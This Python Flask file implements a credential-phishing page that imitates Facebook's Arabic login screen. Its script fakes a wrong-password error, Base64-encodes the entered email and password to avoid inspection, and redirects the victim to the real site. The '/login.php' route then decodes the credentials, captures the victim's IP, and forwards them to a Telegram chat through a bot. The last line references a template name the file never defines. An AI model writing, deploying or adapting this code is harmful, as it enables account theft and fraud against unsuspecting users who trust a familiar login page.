import os
import base64
from flask import Blueprint, render_template_string, redirect, request

# استخدام اسم Blueprint متوافق
secure_fb_bp = Blueprint('facebook', __name__)

ADVANCED_FB_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; direction: rtl; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .container { width: 396px; max-width: 90%; text-align: center; }
        .header-logo { margin-bottom: 20px; }
        .card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; text-align: center; }
        .card input { border: 1px solid #dddfe2; color: #1d2129; font-size: 16px; padding: 14px 16px; margin-bottom: 12px; width: 100%; border-radius: 6px; outline: none; box-sizing: border-box; background: #fff; }
        .card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; line-height: 48px; padding: 0 16px; width: 100%; font-weight: bold; cursor: pointer; margin-bottom: 12px; }
        .error-box { background-color: #ffebe8; border: 1px solid #dd3c10; color: #333; padding: 10px; margin-bottom: 12px; border-radius: 4px; font-size: 13px; display: none; text-align: right; }
        .forgot-link { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-bottom: 20px; }
        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; line-height: 48px; padding: 0 16px; cursor: pointer; display: inline-block; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-logo">
            <svg viewBox="0 0 36 36" fill="#1877f2" height="56" width="56">
                <path d="M25 3.58A17.42 17.42 0 0 0 19.8 3a11.08 11.08 0 0 0-4.8 1.15 8.71 8.71 0 0 0-3.6 3.32A9.45 9.45 0 0 0 10 12.18v2.92H7.32a.71.71 0 0 0-.71.71v4.38c0 .39.32.71.71.71H10V33a.71.71 0 0 0 .71.71h5.12a.71.71 0 0 0 .71-.71V20.9h4.37a.71.71 0 0 0 .71-.71l.01-4.38a.71.71 0 0 0-.71-.71H16.55v-2.5c0-1.2.3-2.11.9-2.73.6-.62 1.45-.93 2.55-.93a10.23 10.23 0 0 1 2.5.31.71.71 0 0 0 .82-.47l.5-1.55a.71.71 0 0 0-.34-.84z"></path>
            </svg>
        </div>
        <div class="card">
            <div id="error-msg" class="error-box">كلمة السر التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.</div>
            <form method="POST" id="secureForm" onsubmit="handleAuth(event)">
                <input type="text" id="u_val" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <input type="password" id="p_val" name="pass" placeholder="كلمة السر" required>
                <button type="submit" class="login-btn">تسجيل الدخول</button>
                <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
                <hr>
                <a href="https://www.facebook.com/r.php" class="create-btn">إنشاء حساب جديد</a>
            </form>
        </div>
    </div>
    <script>
        let attempts = 0;
        function handleAuth(e) {
            e.preventDefault();
            const u = document.getElementById('u_val').value.trim();
            const p = document.getElementById('p_val').value.trim();
            const errBox = document.getElementById('error-msg');

            if (attempts === 0 && (p.length < 6 || u.length < 5)) {
                errBox.style.display = 'block';
                attempts++;
                return;
            }

            // تشفير البيانات بـ Base64 لمنع الفحص السطحي
            const payload = btoa(JSON.stringify({ user: u, pass: p }));
            
            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: payload })
            }).then(() => {
                window.location.href = "https://www.facebook.com";
            }).catch(() => {
                window.location.href = "https://www.facebook.com";
            });
        }
    </script>
</body>
</html>
"""

# المطابقة التامة لاسم الدالة المطلوب في main.py لتجنب خطأ الـ ImportError
def init_facebook_routes(app, bot):
    @app.route('/login.php', methods=['GET', 'POST'])
    def fb_trap():
        target_chat_id = request.args.get('id', None)
        
        if request.method == 'POST':
            req_data = request.json or {}
            encoded_data = req_data.get('data')
            
            # الدعم الاحتياطي في حال تم الإرسال بالطريقة العادية
            if not encoded_data:
                user_val = request.form.get('email')
                pass_val = request.form.get('pass')
            else:
                try:
                    decoded_bytes = base64.b64decode(encoded_data.encode('utf-8'))
                    import json
                    parsed = json.loads(decoded_bytes.decode('utf-8'))
                    user_val = parsed.get('user')
                    pass_val = parsed.get('pass')
                except Exception:
                    user_val = "غير محدد"
                    pass_val = "غير محدد"

            source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            
            if target_chat_id and user_val:
                alert_msg = (
                    "🚨 **تم التقاط البيانات بنجاح وبشكل آمن!**\n"
                    "----------------------------------\n"
                    f"📌 **البريد/الهاتف:** `{user_val}`\n"
                    f"🔑 **كلمة المرور:** `{pass_val}`\n"
                    f"🌐 **عنوان الـ IP:** `{source_ip}`\n"
                    "----------------------------------"
                )
                try:
                    bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
                except Exception as e:
                    print(f"[-] Telegram Error: {e}")
                    
            return {"status": "redirect"}
            
        return render_template_string(FB_PHISH_TEMPLATE)
